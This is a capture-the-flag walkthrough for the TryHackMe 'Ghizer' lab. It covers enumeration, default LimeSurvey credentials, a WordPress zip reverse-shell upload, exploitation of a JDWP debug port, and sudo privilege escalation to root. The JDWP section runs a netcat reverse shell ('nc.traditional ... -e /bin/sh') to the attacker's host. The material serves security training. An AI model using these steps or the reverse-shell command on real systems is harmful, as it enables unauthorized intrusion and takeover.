# 51 - Ghizer (java-rmi/java rmi, JDWP Debug Port exploitation)

Room Link --> [https://tryhackme.com/room/ghizerctf](https://tryhackme.com/room/ghizerctf)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -v 10.10.160.244 -p- -sV

Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
21/tcp    open     ftp?
80/tcp    open     http       Apache httpd 2.4.18 ((Ubuntu))
443/tcp   open     ssl/http   Apache httpd 2.4.18 ((Ubuntu))
18002/tcp open     java-rmi   Java RMI
35797/tcp open     java-rmi   Java RMI
44993/tcp open     tcpwrapped
```
{% endcode %}

#### Dirsearch enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
dirsearch -u http://10.10.160.244 -x 403 -w /usr/share/dirb/wordlists/common.txt -t 500 -x 503

/assets
/admin
/application
/docs
/framework
/installer
/index.php
/locale
/plugins
/server-status
/upload
/themes
/tmp
/tests
# all dead ends :(
```
{% endcode %}

The `/admin` dir. Googled default password for LimeSurvey and got `admin : password` .

And it worked.

<figure><img src=".gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Search for an exploit for the specific version on google and got: [https://www.exploit-db.com/exploits/46634](https://www.exploit-db.com/exploits/46634)

And we get access to a very limited shell.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Search for 'config.php' file.

{% code overflow="wrap" lineNumbers="true" %}
```bash
$ find / -type f -iname 'config.php' 2>/dev/null

$ cat /var/www/html/limesurvey/application/config/config.php
```
{% endcode %}

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`Anny :  P4$W0RD!!#S3CUr3!` .

#### Wordpress enum

Goto the webserver on port 443: `https://10.10.160.244/` - we get the wordpress site, clicking on the login, and we get redirected to the login panel.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can upload a reverse shell in zip format in order to get a rev shell.

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Veronica

We use “**linpeas.sh**” script and we enumerated connections in use of **ghidraDebug** with **Veronica** user.

<figure><img src="https://1.bp.blogspot.com/-11q8WG15zDo/X7irvP-1DRI/AAAAAAAAq30/ETruuKRub1kPHc-TLgbk14heRi0lMvw1gCLcBGAsYHQ/s16000/13.png" alt=""><figcaption></figcaption></figure>

We enumerate **GhidraDebug** service internal on port **18001**.

<figure><img src="https://1.bp.blogspot.com/-kjnBRfJ-I30/X7ir4R_RviI/AAAAAAAAq4A/HSOZQFjbyegl_ImA-Fw9LRI12_PXzRk6wCLcBGAsYHQ/s16000/14.png" alt=""><figcaption></figcaption></figure>

We exploit it from the victim box.

{% code overflow="wrap" %}
```bash
jdb -attach 127.0.0.1:18001
classpath
classes
stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
# wait for a "Logj2-Tf" terminal.
print new java.lang.Runtime().exec("nc.traditional 10.18.88.214 9001 -e /bin/sh")

# setup nc listener.
nc -nvlp 9001
```
{% endcode %}

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Esc to Root

`sudo -l` - there is the `env-reset` also, meaning we can create new env path for files.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can execute this cmd as root. We cant modify the file but we can delete it and replace it with a modified one to get root.

{% code overflow="wrap" %}
```bash
veronica@ubuntu:~$ rm -rf /home/veronica/base.py
veronica@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > base.py
veronica@ubuntu:~$ sudo -u root /usr/bin/python3.5 /home/veronica/base.py
root@ubuntu:~# 
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Done !

